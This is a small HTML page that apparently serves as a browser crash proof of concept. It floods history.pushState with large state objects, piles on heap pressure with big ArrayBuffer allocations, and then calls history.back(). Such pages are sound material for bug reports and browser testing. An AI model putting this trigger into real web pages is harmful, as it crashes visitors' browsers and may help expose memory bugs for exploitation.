<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Minimal History.pushState Crash Test</title>
</head>
<body>

<h1>Minimal History.pushState Boundary Test</h1>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
function log(m){
  document.getElementById("log").textContent += m + "\n";
}

function run(){
  log("[*] Test started");

  try {
    /* 1. Boundary-controlled History growth */
    for (let i = 0; i < 3000; i++) {
      history.pushState(
        { x: "A".repeat(10000) }, // critical size
        "",
        "#"+i
      );
    }

    log("[+] pushState loop completed");

    /* 2. Late heap pressure */
    for (let i = 0; i < 4000; i++) {
      new ArrayBuffer(1024 * 512); // 512 KB
    }

    log("[+] heap pressure applied");

    /* 3. Trigger restoration path */
    history.back();

    log("[!] history.back() executed");

  } catch(e) {
    log("[EXCEPTION] " + e);
  }
}
</script>

</body>
</html>

